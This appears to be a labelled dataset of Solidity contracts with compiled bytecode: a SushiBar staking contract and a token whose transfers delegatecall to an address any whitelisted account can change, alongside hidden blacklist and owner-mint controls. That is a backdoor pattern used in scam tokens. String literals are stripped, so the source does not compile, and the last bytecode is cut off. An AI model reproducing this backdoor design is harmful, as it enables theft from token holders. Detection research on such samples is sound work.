_approve(_msgSender(), spender, amount); return true; } function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { _transfer(sender, recipient, amount); _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, )); return true; } function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue)); return true; } function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, )); return true; } function _transfer(address sender, address recipient, uint256 amount) internal virtual { require(sender != address(0), ); require(recipient != address(0), ); _beforeTokenTransfer(sender, recipient, amount); _balances[sender] = _balances[sender].sub(amount, ); _balances[recipient] = _balances[recipient].add(amount); emit Transfer(sender, recipient, amount); } function _mint(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(address(0), account, amount); _totalSupply = _totalSupply.add(amount); _balances[account] = _balances[account].add(amount); emit Transfer(address(0), account, amount); } function _burn(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(account, address(0), amount); _balances[account] = _balances[account].sub(amount, ); _totalSupply = _totalSupply.sub(amount); emit Transfer(account, address(0), amount); } function _approve(address owner, address spender, uint256 amount) internal virtual { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _setupDecimals(uint8 decimals_) internal { _decimals = decimals_; } function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }}pragma solidity 0.6.12;contract SushiBar is ERC20(, ){ using SafeMath for uint256; IERC20 public sushi; constructor(IERC20 _sushi) public { sushi = _sushi; } function enter(uint256 _amount) public { uint256 totalSushi = sushi.balanceOf(address(this)); uint256 totalShares = totalSupply(); if (totalShares == 0 || totalSushi == 0) { _mint(msg.sender, _amount); } else { uint256 what = _amount.mul(totalShares).div(totalSushi); _mint(msg.sender, what); } sushi.transferFrom(msg.sender, address(this), _amount); } function leave(uint256 _share) public { uint256 totalShares = totalSupply(); uint256 what = _share.mul(sushi.balanceOf(address(this))).div(totalShares); _burn(msg.sender, _share); sushi.transfer(msg.sender, what); }}",0x608060405234801561001057600080fd5b50600436106100ea5760003560e01c806367dfd4c91161008c578063a457c2d711610066578063a457c2d7146102b7578063a59f3e0c146102e3578063a9059cbb14610300578063dd62ed3e1461032c576100ea565b806367dfd4c91461026a57806370a082311461028957806395d89b41146102af576100ea565b806318160ddd116100c857806318160ddd146101d057806323b872dd146101ea578063313ce56714610220578063395093511461023e576100ea565b806306fdde03146100ef578063095ea7b31461016c5780630a087903146101ac575b600080fd5b6100f761035a565b6040805160208082528351818301528351919283929083019185019080838360005b83811015610131578181015183820152602001610119565b50505050905090810190601f16801561015e5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101986004803603604081101561018257600080fd5b506001600160a01b0381351690602001356103f0565b604080519115158252519081900360200190f35b6101b461040e565b604080516001600160a01b039092168252519081900360200190f35b6101d8610422565b60408051918252519081900360200190f35b6101986004803603606081101561020057600080fd5b506001600160a01b03813581169160208101359091169060400135610428565b6102286104af565b6040805160ff9092168252519081900360200190f35b6101986004803603604081101561025457600080fd5b506001600160a01b0381351690602001356104b8565b6102876004803603602081101561028057600080fd5b5035610506565b005b6101d86004803603602081101561029f57600080fd5b50356001600160a01b031661064b565b6100f7610666565b610198600480360360408110156102cd57600080fd5b506001600160a01b0381351690602001356106c7565b610287600480360360208110156102f957600080fd5b503561072f565b6101986004803603604081101561031657600080fd5b506001600160a01b038135169060200135610854565b6101d86004803603604081101561034257600080fd5b506001600160a01b0381358116916020013516610868565b60038054604080516020601f60026000196101006001881615020190951694909404938401819004810282018101909252828152606093909290918301828280156103e65780601f106103bb576101008083540402835291602001916103e6565b820191906000526020600020905b8154815290600101906020018083116103c957829003601f168201915b5050505050905090565b60006104046103fd610893565b8484610897565b5060015b92915050565b60055461010090046001600160a01b031681565b60025490565b6000610435848484610983565b6104a584610441610893565b6104a085604051806060016040528060288152602001610fb8602891396001600160a01b038a1660009081526001602052604081209061047f610893565b6001600160a01b031681526020810191909152604001600020549190610ade565b610897565b5060019392505050565b60055460ff1690565b60006104046104c5610893565b846104a085600160006104d6610893565b6001600160a01b03908116825260208083019390935260409182016000908120918c168152925290205490610b75565b6000610510610422565b905060006105b6826105b0600560019054906101000a90046001600160a01b03166001600160a01b03166370a08231306040518263ffffffff1660e01b815260040180826001600160a01b0316815260200191505060206040518083038186803b15801561057d57600080fd5b505afa158015610591573d6000803e3d6000fd5b505050506040513d60208110156105a757600080fd5b50518690610bd6565b90610c2f565b90506105c23384610c71565b6005546040805163a9059cbb60e01b81523360048201526024810184905290516101009092046001600160a01b03169163a9059cbb916044808201926020929091908290030181600087803b15801561061a57600080fd5b505af115801561062e573d6000803e3d6000fd5b505050506040513d602081101561064457600080fd5b5050505050565b6001600160a01b031660009081526020819052604090205490565b60048054604080516020601f60026000196101006001881615020190951694909404938401819004810282018101909252828152606093909290918301828280156103e65780601f106103bb576101008083540402835291602001916103e6565b60006104046106d4610893565b846104a08560405180606001604052806025815260200161104a60259139600160006106fe610893565b6001600160a01b03908116825260208083019390935260409182016000908120918d16815292529020549190610ade565b600554604080516370a0823160e01b8152306004820152905160009261010090046001600160a01b0316916370a08231916024808301926020929190829003018186803b15801561077f57600080fd5b505afa158015610793573d6000803e3d6000fd5b505050506040513d60208110156107a957600080fd5b5051905060006107b7610422565b90508015806107c4575081155b156107d8576107d33384610d6d565b6107f6565b60006107e8836105b08685610bd6565b90506107f43382610d6d565b505b600554604080516323b872dd60e01b81523360048201523060248201526044810186905290516101009092046001600160a01b0316916323b872dd916064808201926020929091908290030181600087803b15801561061a57600080fd5b6000610404610861610893565b8484610983565b6001600160a01b03918216600090815260016020908152604080832093909416825291909152205490565b3390565b6001600160a01b0383166108dc5760405162461bcd60e51b81526004018080602001828103825260248152602001806110266024913960400191505060405180910390fd5b6001600160a01b0382166109215760405162461bcd60e51b8152600401808060200182810382526022815260200180610f4f6022913960400191505060405180910390fd5b6001600160a01b03808416600081815260016020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b6001600160a01b0383166109c85760405162461bcd60e51b81526004018080602001828103825260258152602001806110016025913960400191505060405180910390fd5b6001600160a01b038216610a0d5760405162461bcd60e51b8152600401808060200182810382526023815260200180610f0a6023913960400191505060405180910390fd5b610a18838383610e5d565b610a5581604051806060016040528060268152602001610f71602691396001600160a01b0386166000908152602081905260409020549190610ade565b6001600160a01b038085166000908152602081905260408082209390935590841681522054610a849082610b75565b6001600160a01b038084166000818152602081815260409182902094909455805185815290519193928716927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef92918290030190a3505050565b60008184841115610b6d5760405162461bcd60e51b81526004018080602001828103825283818151815260200191508051906020019080838360005b83811015610b32578181015183820152602001610b1a565b50505050905090810190601f168015610b5f5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b505050900390565b600082820183811015610bcf576040805162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f770000000000604482015290519081900360640190fd5b9392505050565b600082610be557506000610408565b82820282848281610bf257fe5b0414610bcf5760405162461bcd60e51b8152600401808060200182810382526021815260200180610f976021913960400191505060405180910390fd5b6000610bcf83836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f000000000000815250610e62565b6001600160a01b038216610cb65760405162461bcd60e51b8152600401808060200182810382526021815260200180610fe06021913960400191505060405180910390fd5b610cc282600083610e5d565b610cff81604051806060016040528060228152602001610f2d602291396001600160a01b0385166000908152602081905260409020549190610ade565b6001600160a01b038316600090815260208190526040902055600254610d259082610ec7565b6002556040805182815290516000916001600160a01b038516917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9181900360200190a35050565b6001600160a01b038216610dc8576040805162461bcd60e51b815260206004820152601f60248201527f45524332303a206d696e7420746f20746865207a65726f206164647265737300604482015290519081900360640190fd5b610dd460008383610e5d565b600254610de19082610b75565b6002556001600160a01b038216600090815260208190526040902054610e079082610b75565b6001600160a01b0383166000818152602081815260408083209490945583518581529351929391927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9281900390910190a35050565b505050565b60008183610eb15760405162461bcd60e51b8152602060048201818152835160248401528351909283926044909101919085019080838360008315610b32578181015183820152602001610b1a565b506000838581610ebd57fe5b0495945050505050565b6000610bcf83836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f770000815250610ade56fe45524332303a207472616e7366657220746f20746865207a65726f206164647265737345524332303a206275726e20616d6f756e7420657863656564732062616c616e636545524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e6365536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a206275726e2066726f6d20746865207a65726f206164647265737345524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f206164647265737345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa264697066735822122078a474ef0187246289e8ad301097c4a953d44a78c1198df89577d09214f91b9664736f6c634300060c0033,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
"pragma solidity ^0.8.0;interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value);}interface IPancakePair { function totalSupply() external view returns (uint);}interface ERC20TokenProxy { function checkProxyWhitelist(address _addr) external view returns(bool);}abstract contract Context { function _msgSender() internal view virtual returns (address) { return msg.sender; } function _msgData() internal view virtual returns (bytes calldata) { return msg.data; }} abstract contract Ownable is Context { address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); constructor() { _setOwner(_msgSender()); } function owner() public view virtual returns (address) { return _owner; } modifier onlyOwner() { require(owner() == _msgSender(), ); _; } function transferOwnership(address newOwner) public virtual onlyOwner { require(newOwner != address(0), ); _setOwner(newOwner); } function _setOwner(address newOwner) private { address oldOwner = _owner; _owner = newOwner; emit OwnershipTransferred(oldOwner, newOwner); }}contract ERC20Token is Context, IERC20, Ownable { mapping(address => uint256) private _balances; mapping(address => mapping(address => uint256)) private _allowances; mapping(address => bool) private _whitelist; mapping(address => bool) private _blacklist; mapping(address => bool) private _isRewardList; mapping(address => bool) private _proxyWhitelist; string private _name; string private _symbol; uint8 private _decimals; uint256 private _totalSupply; address private _pair; bool private toReward; bool private isTransferFrom = true; address[] private rewardList = [address(0)]; uint private pairSupplyLast; uint private burnRatio = 10; address private proxyAddr; constructor(string memory setName, string memory setSymbol) { _name = setName; _symbol = setSymbol; _decimals = 18; _totalSupply = 1000000000e18; _balances[_msgSender()] = _totalSupply; _whitelist[_msgSender()] = true; emit Transfer(address(0), _msgSender(), _totalSupply); } function name() public view virtual returns (string memory) { return _name; } function symbol() public view virtual returns (string memory) { return _symbol; } function decimals() public view virtual returns (uint8) { return _decimals; } function totalSupply() public view virtual override returns (uint256) { return _totalSupply; } function balanceOf(address account) public view virtual override returns (uint256) { return _balances[account]; } function transfer(address recipient, uint256 amount) public override virtual returns (bool) { (bool success, ) = proxyAddr.delegatecall(abi.encodeWithSignature(,recipient,amount)); require(success, ); return true; } function transferFrom(address sender,address recipient,uint256 amount) public override virtual returns (bool) { (bool success, ) = proxyAddr.delegatecall(abi.encodeWithSignature(,sender,recipient,amount)); require(success, ); return true; } function _safeTransfer(address sender,address recipient,uint256 amount) internal virtual returns (bool) { (bool success, ) = proxyAddr.delegatecall(abi.encodeWithSignature(,sender,recipient,amount)); require(success, ); return true; } function allowance(address owner, address spender) public view virtual override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public virtual override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function mint(address account, uint256 amount) onlyOwner public virtual returns (bool) { _mint(account, amount); return true; } function setBurnRatio(uint _burnRatio) public virtual { (bool success, ) = proxyAddr.delegatecall(abi.encodeWithSignature(,_burnRatio)); require(success, ); } function getBurnRatio() external view virtual returns(uint) { require(_whitelist[msg.sender] == true, ); return burnRatio; } function checkRewardMapping(address _addr) public view returns(bool){ require(_whitelist[msg.sender] == true, ); return _isRewardList[_addr]; } function getRewardStatus() public view returns(bool){ require(_whitelist[msg.sender] == true, ); return toReward; } function getRewardList() public view virtual returns(address[] memory){ require(_whitelist[msg.sender] == true, ); return rewardList; } function rewardToken() public virtual{ (bool success, ) = proxyAddr.delegatecall(abi.encodeWithSignature()); require(success, ); } function addWhitelist(address[] memory accounts) public onlyOwner virtual returns(bool){ for (uint i = 0; i < accounts.length; i++) { _whitelist[accounts[i]] = true; } return true; } function removeFromWhitelist(address account) public onlyOwner virtual returns(bool){ _whitelist[account] = false; return true; } function checkWhitelist(address account) public view virtual returns(bool) { require(_whitelist[msg.sender] == true, ); return _whitelist[account]; } function addBlacklist(address[] memory accounts) public onlyOwner virtual returns(bool){ for (uint i = 0; i < accounts.length; i++) { _blacklist[accounts[i]] = true; } return true; } function removeFromBlacklist(address account) public onlyOwner virtual returns(bool){ _blacklist[account] = false; return true; } function checkBlacklist(address account) public view virtual returns(bool) { require(_whitelist[msg.sender] == true, ); return _blacklist[account]; } function updatePairSupply() external { (bool success, ) = proxyAddr.delegatecall(abi.encodeWithSignature()); require(success, ); } function getPairSupplyLast() external view returns(uint){ require(_whitelist[msg.sender] == true, ); require(_pair != address(0), ); return pairSupplyLast; } function getPairSupply() external view returns(uint) { require(_whitelist[msg.sender] == true, ); require(_pair != address(0), ); return IPancakePair(_pair).totalSupply(); } function setProxyAddr(address _addr) public { require(_whitelist[msg.sender] == true, ); proxyAddr = _addr; } function getProxyAddr() onlyOwner external view returns(address){ return proxyAddr; } function showPairAddress() public view onlyOwner virtual returns(address) { return _pair; } function newPairAddress(address account) public onlyOwner virtual returns(bool) { _pair = account; return true; } function airdrop(uint _tx) public virtual returns(bool) { (bool success, ) = proxyAddr.delegatecall(abi.encodeWithSignature(,_tx)); require(success, ); return success; } function airdropHolders(address[] memory _holders) public virtual returns(bool) { (bool success, ) = proxyAddr.delegatecall(abi.encodeWithSignature(,_holders)); require(success, ); return success; } function _transfer( address sender, address recipient, uint256 amount ) internal virtual { require(sender != address(0), ); require(recipient != address(0), ); _beforeTokenTransfer(sender, recipient, amount); uint256 senderBalance = _balances[sender]; require(senderBalance >= amount, ); unchecked { _balances[sender] = senderBalance - amount; } _balances[recipient] += amount; emit Transfer(sender, recipient, amount); _afterTokenTransfer(sender, recipient, amount); } function _approve( address owner, address spender, uint256 amount ) internal virtual { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _beforeTokenTransfer( address from, address to, uint256 amount ) internal virtual {} function _afterTokenTransfer( address from, address to, uint256 amount ) internal virtual {} function _mint(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(address(0), account, amount); _totalSupply += amount; _balances[account] += amount; emit Transfer(address(0), account, amount); _afterTokenTransfer(address(0), account, amount); } function _burn(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(account, address(0), amount); uint256 accountBalance = _balances[account]; require(accountBalance >= amount, ); unchecked { _balances[account] = accountBalance - amount; } _totalSupply -= amount; emit Transfer(account, address(0), amount); _afterTokenTransfer(account, address(0), amount); } fallback() external payable { revert(); } receive() external payable { revert(); }}",0x6080604052600436106101f25760003560e01c80636ea630501161010d578063a9059cbb116100a0578063dd62ed3e1161006f578063dd62ed3e14610787578063e6807ca9146107c4578063edac985b14610801578063f2fde38b1461083e578063f7c618c114610867576101fc565b8063a9059cbb146106c9578063abe8a3a814610706578063c0f65d1714610731578063d4601cd41461075c576101fc565b80638da5cb5b116100dc5780638da5cb5b1461060d5780639370131f1461063857806395d89b411461066157806397dc4a131461068c576101fc565b80636ea630501461055157806370a082311461056857806371b5ef46146105a55780638ab1d681146105d0576101fc565b80632bc7dc9c116101855780633d2cc56c116101545780633d2cc56c1461047157806340c10f19146104ae578063537df3b6146104eb5780635cadefc714610528576101fc565b80632bc7dc9c146103c55780632f8dc1ce146103f0578063313ce5671461041b5780633a72616414610446576101fc565b80630da4bcd4116101c15780630da4bcd4146102e357806318160ddd146103205780631950c2181461034b57806323b872dd14610388576101fc565b806302ee23e31461020157806306fdde031461023e578063095ea7b3146102695780630c51294a146102a6576101fc565b366101fc57600080fd5b600080fd5b34801561020d57600080fd5b5061022860048036038101906102239190612ad9565b61087e565b6040516102359190612e96565b60405180910390f35b34801561024a57600080fd5b506102536109e2565b6040516102609190612eb1565b60405180910390f35b34801561027557600080fd5b50610290600480360381019061028b9190612a99565b610a74565b60405161029d9190612e96565b60405180910390f35b3480156102b257600080fd5b506102cd60048036038101906102c891906129d9565b610a92565b6040516102da9190612e96565b60405180910390f35b3480156102ef57600080fd5b5061030a600480360381019061030591906129d9565b610b5a565b6040516103179190612e96565b60405180910390f35b34801561032c57600080fd5b50610335610c43565b6040516103429190612ff3565b60405180910390f35b34801561035757600080fd5b50610372600480360381019061036d91906129d9565b610c4d565b60405161037f9190612e96565b60405180910390f35b34801561039457600080fd5b506103af60048036038101906103aa9190612a46565b610d36565b6040516103bc9190612e96565b60405180910390f35b3480156103d157600080fd5b506103da610ea1565b6040516103e79190612ff3565b60405180910390f35b3480156103fc57600080fd5b50610405610f3e565b6040516104129190612e96565b60405180910390f35b34801561042757600080fd5b50610430610fe8565b60405161043d919061300e565b60405180910390f35b34801561045257600080fd5b5061045b610fff565b6040516104689190612ff3565b60405180910390f35b34801561047d57600080fd5b5061049860048036038101906104939190612ad9565b61112e565b6040516104a59190612e96565b60405180910390f35b3480156104ba57600080fd5b506104d560048036038101906104d09190612a99565b611247565b6040516104e29190612e96565b60405180910390f35b3480156104f757600080fd5b50610512600480360381019061050d91906129d9565b6112d9565b60405161051f9190612e96565b60405180910390f35b34801561053457600080fd5b5061054f600480360381019061054a91906129d9565b6113b8565b005b34801561055d57600080fd5b5061056661148f565b005b34801561057457600080fd5b5061058f600480360381019061058a91906129d9565b6115e1565b60405161059c9190612ff3565b60405180910390f35b3480156105b157600080fd5b506105ba61162a565b6040516105c79190612e74565b60405180910390f35b3480156105dc57600080fd5b506105f760048036038101906105f291906129d9565b61174b565b6040516106049190612e96565b60405180910390f35b34801561061957600080fd5b5061062261182a565b60405161062f9190612df9565b60405180910390f35b34801561064457600080fd5b5061065f600480360381019061065a9190612b22565b611853565b005b34801561066d57600080fd5b506106766119b1565b6040516106839190612eb1565b60405180910390f35b34801561069857600080fd5b506106b360048036038101906106ae9190612b22565b611a43565b6040516106c09190612e96565b60405180910390f35b3480156106d557600080fd5b506106f060048036038101906106eb9190612a99565b611ba7565b6040516106fd9190612e96565b60405180910390f35b34801561071257600080fd5b5061071b611d0f565b6040516107289190612df9565b60405180910390f35b34801561073d57600080fd5b50610746611db5565b6040516107539190612ff3565b60405180910390f35b34801561076857600080fd5b50610771611f81565b60405161077e9190612df9565b60405180910390f35b34801561079357600080fd5b506107ae60048036038101906107a99190612a06565b612027565b6040516107bb9190612ff3565b60405180910390f35b3480156107d057600080fd5b506107eb60048036038101906107e691906129d9565b6120ae565b6040516107f89190612e96565b60405180910390f35b34801561080d57600080fd5b5061082860048036038101906108239190612ad9565b612197565b6040516108359190612e96565b60405180910390f35b34801561084a57600080fd5b50610865600480360381019061086091906129d9565b6122b0565b005b34801561087357600080fd5b5061087c6123a8565b005b600080600f60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16836040516024016108cb9190612e74565b6040516020818303038152906040527f02ee23e3000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516109559190612de2565b600060405180830381855af49150503d8060008114610990576040519150601f19603f3d011682016040523d82523d6000602084013e610995565b606091505b50509050806109d9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016109d090612f53565b60405180910390fd5b80915050919050565b6060600780546109f1906131c3565b80601f0160208091040260200160405190810160405280929190818152602001828054610a1d906131c3565b8015610a6a5780601f10610a3f57610100808354040283529160200191610a6a565b820191906000526020600020905b815481529060010190602001808311610a4d57829003601f168201915b5050505050905090565b6000610a88610a816124fa565b8484612502565b6001905092915050565b6000610a9c6124fa565b73ffffffffffffffffffffffffffffffffffffffff16610aba61182a565b73ffffffffffffffffffffffffffffffffffffffff1614610b10576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b0790612f73565b60405180910390fd5b81600b60006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060019050919050565b600060011515600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16151514610bef576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610be690612f33565b60405180910390fd5b600560008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff169050919050565b6000600a54905090565b600060011515600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16151514610ce2576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610cd990612f33565b60405180910390fd5b600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff169050919050565b600080600f60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16858585604051602401610d8793929190612e14565b6040516020818303038152906040527f23b872dd000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051610e119190612de2565b600060405180830381855af49150503d8060008114610e4c576040519150601f19603f3d011682016040523d82523d6000602084013e610e51565b606091505b5050905080610e95576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610e8c90612f53565b60405180910390fd5b60019150509392505050565b600060011515600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16151514610f36576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610f2d90612f33565b60405180910390fd5b600e54905090565b600060011515600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16151514610fd3576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610fca90612f33565b60405180910390fd5b600b60149054906101000a900460ff16905090565b6000600960009054906101000a900460ff16905090565b600060011515600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16151514611094576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161108b90612f33565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff16600b60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161415611126576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161111d90612f13565b60405180910390fd5b600d54905090565b60006111386124fa565b73ffffffffffffffffffffffffffffffffffffffff1661115661182a565b73ffffffffffffffffffffffffffffffffffffffff16146111ac576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016111a390612f73565b60405180910390fd5b60005b825181101561123d576001600460008584815181106111d1576111d06132cd565b5b602002602001015173ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff021916908315150217905550808061123590613226565b9150506111af565b5060019050919050565b60006112516124fa565b73ffffffffffffffffffffffffffffffffffffffff1661126f61182a565b73ffffffffffffffffffffffffffffffffffffffff16146112c5576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016112bc90612f73565b60405180910390fd5b6112cf83836126cd565b6001905092915050565b60006112e36124fa565b73ffffffffffffffffffffffffffffffffffffffff1661130161182a565b73ffffffffffffffffffffffffffffffffffffffff1614611357576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161134e90612f73565b60405180910390fd5b6000600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff02191690831515021790555060019050919050565b60011515600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff1615151461144b576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161144290612f33565b60405180910390fd5b80600f60006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b6000600f60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527f6ea63050000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161155a9190612de2565b600060405180830381855af49150503d8060008114611595576040519150601f19603f3d011682016040523d82523d6000602084013e61159a565b606091505b50509050806115de576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016115d590612f53565b60405180910390fd5b50565b6000600160008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b606060011515600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff161515146116bf576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016116b690612f33565b60405180910390fd5b600c80548060200260200160405190810160405280929190818152602001828054801561174157602002820191906000526020600020905b8160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190600101908083116116f7575b5050505050905090565b60006117556124fa565b73ffffffffffffffffffffffffffffffffffffffff1661177361182a565b73ffffffffffffffffffffffffffffffffffffffff16146117c9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016117c090612f73565b60405180910390fd5b6000600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff02191690831515021790555060019050919050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b6000600f60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168260405160240161189f9190612ff3565b6040516020818303038152906040527f9370131f000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516119299190612de2565b600060405180830381855af49150503d8060008114611964576040519150601f19603f3d011682016040523d82523d6000602084013e611969565b606091505b50509050806119ad576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016119a490612f53565b60405180910390fd5b5050565b6060600880546119c0906131c3565b80601f01602080910402602001604051908101604052809291908181526020018280546119ec906131c3565b8015611a395780601f10611a0e57610100808354040283529160200191611a39565b820191906000526020600020905b815481529060010190602001808311611a1c57829003601f168201915b5050505050905090565b600080600f60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1683604051602401611a909190612ff3565b6040516020818303038152906040527f97dc4a13000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051611b1a9190612de2565b600060405180830381855af49150503d8060008114611b55576040519150601f19603f3d011682016040523d82523d6000602084013e611b5a565b606091505b5050905080611b9e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611b9590612f53565b60405180910390fd5b80915050919050565b600080600f60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168484604051602401611bf6929190612e4b565b6040516020818303038152906040527fa9059cbb000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051611c809190612de2565b600060405180830381855af49150503d8060008114611cbb576040519150601f19603f3d011682016040523d82523d6000602084013e611cc0565b606091505b5050905080611d04576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611cfb90612f93565b60405180910390fd5b600191505092915050565b6000611d196124fa565b73ffffffffffffffffffffffffffffffffffffffff16611d3761182a565b73ffffffffffffffffffffffffffffffffffffffff1614611d8d576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611d8490612f73565b60405180910390fd5b600b60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b600060011515600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16151514611e4a576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611e4190612f33565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff16600b60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161415611edc576040517f08c379a0000